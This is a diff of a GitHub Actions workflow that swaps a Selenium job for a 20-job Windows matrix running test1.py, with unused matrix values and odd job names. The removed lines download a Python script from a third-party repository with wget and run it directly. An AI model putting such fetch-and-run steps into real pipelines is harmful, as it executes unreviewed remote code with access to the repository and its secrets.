@@ -1,29 +1,28 @@
-name: Selenium Workflow
-
-on: [push]
-
+name: My Pyth12 Web
+# ------------------------------------ #
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+# ------------------------------------ #
 jobs:
-  build:
-    runs-on: ubuntu-latest
+  
+  rTt-linu:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        python-version: [3.9,3.10]
+        check: [tes1,test2,test3,test4,test5,test6,test7,test8,test9,test10]
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      - name: Set up Python environment
-        uses: actions/setup-python@v2
-        with:
-          python-version: '3.12'
-
-      - name: Install dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install selenium
-          # Optional: Install additional dependencies if required
-          # pip install -r requirements.txt
-
-      - name: Ensure chromedriver permissions
-        run: sudo chmod +x /usr/bin/chromedriver
-
-      - name: Run Selenium script
-        run: |
-          wget https://github.com/Mosnio/Rlin/raw/main/r2.py && python r2.py 
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: TESTING
+      run: |
+        pip3 install selenium
+        python test1.py
